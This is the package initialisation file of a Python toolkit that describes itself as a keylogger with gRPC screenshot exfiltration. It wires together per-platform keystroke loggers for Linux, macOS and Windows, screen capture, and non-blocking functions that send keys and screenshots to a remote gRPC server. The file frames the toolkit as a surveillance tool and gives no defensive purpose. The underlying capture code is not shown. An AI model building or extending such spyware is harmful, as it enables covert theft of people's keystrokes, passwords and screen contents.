import platform

# Get current OS
_os = platform.system().lower()

# Common imports (work on all platforms)
from .grpc_serve import KeylogServer
from .cln import send_key_non_blocking as send_key
from .cln import send_screenshot_non_blocking as send_screenshot
from .cln import send_screenshot_bytes_non_blocking as send_screenshot_bytes
from .cln import configure as configure_client
from .capture import take_screenshot as global_screencapture

# Platform-specific imports - only import what works on current OS
# Define dummy functions for other platforms to avoid import errors

def _not_supported(*args, **kwargs):
    raise NotImplementedError("This keylogger is not supported on current platform")

# Set defaults
loggerFunctionLinux = _not_supported
loggerFunctionMac = _not_supported
loggerFunctionWindows = _not_supported

# Import only the logger for current platform
if 'linux' in _os:
    from .linlog import loggerFunction as loggerFunctionLinux
elif 'darwin' in _os:
    from .maclog import loggerFunction as loggerFunctionMac
elif 'windows' in _os:
    from .winlog import loggerFunction as loggerFunctionWindows

__all__ = [
    'send_key',
    'send_screenshot',
    'send_screenshot_bytes',
    'configure_client',
    'loggerFunctionLinux',
    'loggerFunctionMac',
    'loggerFunctionWindows',
    'global_screencapture',
    'KeylogServer',
]
__version__ = '2.0.0'
__author__ = 'pengux8 (aka) wail sari bey'
__description__ = 'keylogger toolkit with gRPC screenshot exfiltration'

